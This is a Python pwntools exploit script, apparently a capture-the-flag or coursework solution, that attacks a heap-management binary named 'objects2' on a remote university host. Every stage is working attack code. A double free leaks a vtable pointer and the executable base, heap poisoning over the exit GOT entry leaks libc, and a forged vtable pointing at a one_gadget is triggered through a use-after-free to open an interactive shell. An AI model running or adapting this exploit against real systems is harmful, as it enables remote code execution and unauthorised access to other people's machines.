from pwn import *

def get_process():
    if args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4464)
    else:
        return remote('localhost', 4464)
    
elf = context.binary = ELF('./objects2')
libc = elf.libc
context.log_level = 'debug'

p = get_process()

# useful addresses
_ZTV4Base = elf.symbols['_ZTV4Base']
log.info(f"_ZTV4Base: {hex(_ZTV4Base)}") 
exit_got_offset = elf.got['exit']
log.info(f"exit_got_offset: {hex(exit_got_offset)}")
exit_libc_offset = libc.symbols['exit']
log.info(f"exit_libc_offset: {hex(exit_libc_offset)}")
one_gadget_offset = 0xcbd20

# stage 1: leak exe base
p.sendline(b'oAb00') # create new obj base
p.recvline() # discard first line
p.sendline(b'DA')
p.sendline(b'DA') # trigger double free

p.sendline(b'oBb00') # create new obj base (reuses freed chunk)
p.recvline() # discard line

p.sendline(b'cK08') # create new key that overlaps the object
p.recvline() # discard line

p.sendline(b'sK') # show key
base_vtable_leak = u64(p.recvn(8).strip().ljust(8, b'\x00'))
log.success(f"base_vtable_leak: {hex(base_vtable_leak)}")
exe_base = base_vtable_leak - (_ZTV4Base + 0x10) 
log.success(f"exe_base: {hex(exe_base)}")
elf.address = exe_base
p.sendline(b'q') # quit
p.close()

# stage 2: leak libc base
p = get_process()
p.sendline(b'oAb00') # create new obj base
p.recvline() # discard first line
p.sendline(b'DA')
p.sendline(b'DA') # trigger double free

p.sendline(b'cA08') # creates a key that overlaps the object
p.recvline() # discard
p.sendline(b'aA' + p64(exe_base + exit_got_offset-16))

p.send(b'cB08') 
p.recvline() # discard
p.sendline(b'cC08')
p.recvline() # discard

p.sendline(b'sC') # show key
exit_leak = u64(p.recvn(8).strip().ljust(8, b'\x00'))
log.success(f"exit_leak: {hex(exit_leak)}")
libc_base = exit_leak - exit_libc_offset
log.success(f"libc_base: {hex(libc_base)}")
libc.address = libc_base
p.close()

# stage 3: gadget time and it's started gadgeting all over
p = get_process()
one_gadget = libc_base + one_gadget_offset
# same as object1
# create vtable pointing to one_gadget
p.sendline(b'cV08')
vtable_addr = int(p.recvline().strip(), 16)
log.info(f'vtable address: {hex(vtable_addr)}')
one_gadget_addr = libc_base + one_gadget_offset
log.info(f'one_gadget address: {hex(one_gadget_addr)}')
p.sendline(b'aV' + p64(one_gadget_addr))

# use after free to trigger the one_gadget
p.sendline(b'oAb00')
p.sendline(b'DA')
# sanirty check
addr1 = p.recvline().strip()
p.sendline(b'cK16')
addr2 = p.recvline().strip()
# we should get the same address since the object is freed
if addr1 != addr2:
    log.error('UAF failed!')
    exit()

p.sendline(b'aK' + p64(vtable_addr) + p64(0))
p.sendline(b'uA') # trigger use after free - use object A
p.interactive()